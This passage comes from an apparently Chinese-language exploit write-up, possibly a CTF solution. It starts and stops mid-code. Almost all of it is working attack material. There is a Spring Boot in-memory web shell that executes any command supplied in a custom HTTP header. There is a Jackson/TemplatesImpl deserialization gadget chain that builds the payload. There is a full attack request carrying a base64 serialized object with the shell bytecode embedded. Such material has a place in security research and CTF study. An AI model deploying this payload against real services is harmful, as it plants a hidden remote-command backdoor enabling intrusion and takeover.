punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">SpringBootMemoryShellOfController</span><span class="token punctuation">(</span>String test<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">boolean</span> isLinux <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            String osTyp <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>osTyp <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> osTyp<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                isLinux <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> isLinux <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span> <span class="token string">"/c"</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>            InputStream in <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Scanner s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String output <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> s<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于<code>JackSon</code>的<code>exp</code>我是直接抄的网上通过<code>AOPProxy</code>解决<code>jackson</code>链不稳定的版本。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> gadget<span class="token punctuation">;</span><span class="token keyword">import</span> gadget<span class="token punctuation">.</span>memshell<span class="token punctuation">.</span>SpringBootMemoryShellOfController<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>AdvisedSupport<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>GadgetUtils<span class="token punctuation">;</span><span class="token keyword">import</span> util<span class="token punctuation">.</span>SerializerUtils<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//BadAttributeValueExpException.toString -> POJONode -> getter -> TemplatesImpl</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Jackson</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        final Object template = GadgetUtils.createTemplatesImpl(SpringBootMemoryShellOfController.class);</span><span class="token comment" spellcheck="true">//        final Object template = GadgetUtils.templatesImplLocalWindows();</span>        CtClass ctClass <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtMethod writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将修改后的CtClass加载至当前线程的上下文类加载器中</span>        ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span><span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        POJONode node = new POJONode(template);</span>        BadAttributeValueExpException val <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field valfield <span class="token operator">=</span> val<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><span class="token comment" spellcheck="true">//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);</span><span class="token comment" spellcheck="true">//        oos.writeObject(val);</span><span class="token comment" spellcheck="true">//        SerializerUtils.unserialize(SerializerUtils.serialize(val));</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>SerializerUtils<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">makeTemplatesImplAopProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        AdvisedSupport advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> Object template <span class="token operator">=</span> GadgetUtils<span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>SpringBootMemoryShellOfController<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor constructor <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>AdvisedSupport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object proxy <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> proxy<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击：</p><pre><code>classes=org.springframework.core.annotation.AnnotationAttributes&amp;obj=%7B%22%40type%22%3A%22com.example.jackson.SecurityCheck%22%2C%22safe%22%3Afalse%2C%22treeMap%22%3A%7B%22%40type%22%3A%22java.util.HashSet%22%2C%22map%22%3A%7B%22rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAAXNyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAInQADmdhZGdldC5KYWNrc29udAAMSmFja3Nvbi5qYXZhdAAEbWFpbnNyACZqYXZhLnV0aWwuQ29sbGVjdGlvbnMkVW5tb2RpZmlhYmxlTGlzdPwPJTG17I4QAgABTAAEbGlzdHEAfgAHeHIALGphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVDb2xsZWN0aW9uGUIAgMte9x4CAAFMAAFjdAAWTGphdmEvdXRpbC9Db2xsZWN0aW9uO3hwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAB3BAAAAAB4cQB%2BABV4c3IALGNvbS5mYXN0ZXJ4bWwuamFja3Nvbi5kYXRhYmluZC5ub2RlLlBPSk9Ob2RlAAAAAAAAAAICAAFMAAZfdmFsdWVxAH4AAXhyAC1jb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5WYWx1ZU5vZGUAAAAAAAAAAQIAAHhyADBjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5CYXNlSnNvbk5vZGUAAAAAAAAAAQIAAHhwc30AAAABAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlc3hyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAARaAA1lcXVhbHNEZWZpbmVkWgAPaGFzaENvZGVEZWZpbmVkTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7WwARcHJveGllZEludGVyZmFjZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAFWgALcHJlRmlsdGVyZWRMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzcQB%2BAAdMAAppbnRlcmZhY2VzcQB%2BAAdMAAx0YXJnZXRTb3VyY2V0ACZMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvVGFyZ2V0U291cmNlO3hyAC1vcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuUHJveHlDb25maWeLS%2FPmp%2BD3bwIABVoAC2V4cG9zZVByb3h5WgAGZnJvemVuWgAGb3BhcXVlWgAIb3B0aW1pemVaABBwcm94eVRhcmdldENsYXNzeHAAAAAAAABzcgA8b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkRlZmF1bHRBZHZpc29yQ2hhaW5GYWN0b3J5VN1kN%2BJOcfcCAAB4cHNxAH4AFAAAAAB3BAAAAAB4c3EAfgAUAAAAAHcEAAAAAHhzcgA0b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AudGFyZ2V0LlNpbmdsZXRvblRhcmdldFNvdXJjZX1VbvXH%2BPq6AgABTAAGdGFyZ2V0cQB%2BAAF4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB%2BACBMAAVfbmFtZXEAfgAFTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA%2F%2F%2F%2F%2F3VyAANbW0JL%2FRkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF%2FgGCFTgAgAAeHAAABdGyv66vgAAADQBDQoAOQCCCgCDAIQJABAAhQoAhgCHCACICwCJAIoHAIsHAIwLAAcAjQoAjgCPCABKCgASAJAKAJEAkgoAkQCTBwCVBwCWCABdBwCXBwCYBwCZCgASAJoHAJsIAJwKAJQAnQsAngCfCwCeAKAKAIMAoQgAogoAEACjCgAIAKQJAKUApgoApwCoCACpCwATAKoIAKsKAKUArAoAFgCtCACuCgAWAK8IALAIALEIALIIALMKALQAtQoAtAC2CgC3ALgHALkKAC8AuggAuwoALwC8CgAvAL0KAC8AvggAvwsAFADACgDBAMIKAMEAwwcAxAEAAWkBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAIXNwcmluZ0Jvb3RNZW1vcnlTaGVsbE9mQ29udHJvbGxlcgEAM0xnYWRnZXQvbWVtc2hlbGwvU3ByaW5nQm9vdE1lbW9yeVNoZWxsT2ZDb250cm9sbGVyOwEABHRoaXMBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAC2NvbmZpZ0ZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABmNvbmZpZwEAFEJ1aWxkZXJDb25maWd1cmF0aW9uAQAMSW5uZXJDbGFzc2VzAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAARpbmZvAQA%2FTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQANU3RhY2tNYXBUYWJsZQcAlgcAiwcAjAcAxQcAlQcAxgcAxwEACkV4Y2VwdGlvbnMHAMgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAR0ZXN0AQASTGphdmEvbGFuZy9TdHJpbmc7AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAB2lzTGludXgBAAFaAQAFb3NUeXABAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7BwCbBwBkBwDJBwC5BwCYBwCZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcAygEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAJlNwcmluZ0Jvb3RNZW1vcnlTaGVsbE9mQ29udHJvbGxlci5qYXZhDAA8AD0HAMsMAMwAzQwAOgA7BwDODADPANABADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHANEMANIA0wEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA1ADVBwDWDADXANgMANkA2gcAxQwA2wDcDADdAN4HAMcBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uAQAxZ2FkZ2V0L21lbXNoZWxsL1NwcmluZ0Jvb3RNZW1vcnlTaGVsbE9mQ29udHJvbGxlcgEAD2phdmEvbGFuZy9DbGFzcwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQwA3wDgAQAQamF2YS9sYW5nL1N0cmluZwEABi90ZXN0MgwA4QDjBwDkDADlAOYMAOcA6AwA6QDqAQADYWFhDAA8AFwMAOsA7AcA7QwA7gDvBwDwDADxAPIBAAhzcXVpcnQxZQwA8wD0AQAHb3MubmFtZQwA9QD0DAD2APcBAAN3aW4MAPgA%2BQEAAnNoAQACLWMBAAdjbWQuZXhlAQACL2MHAPoMAPsA%2FAwA%2FQD%2BBwD%2FDAEAAQEBABFqYXZhL3V0aWwvU2Nhbm5lcgwAPAECAQACXEEMAQMBBAwBBQEGDAEHAPcBAAAMAQgBCQcBCgwBCwBcDAEMAD0BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAD1vcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAQamF2YS9sYW5nL09iamVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3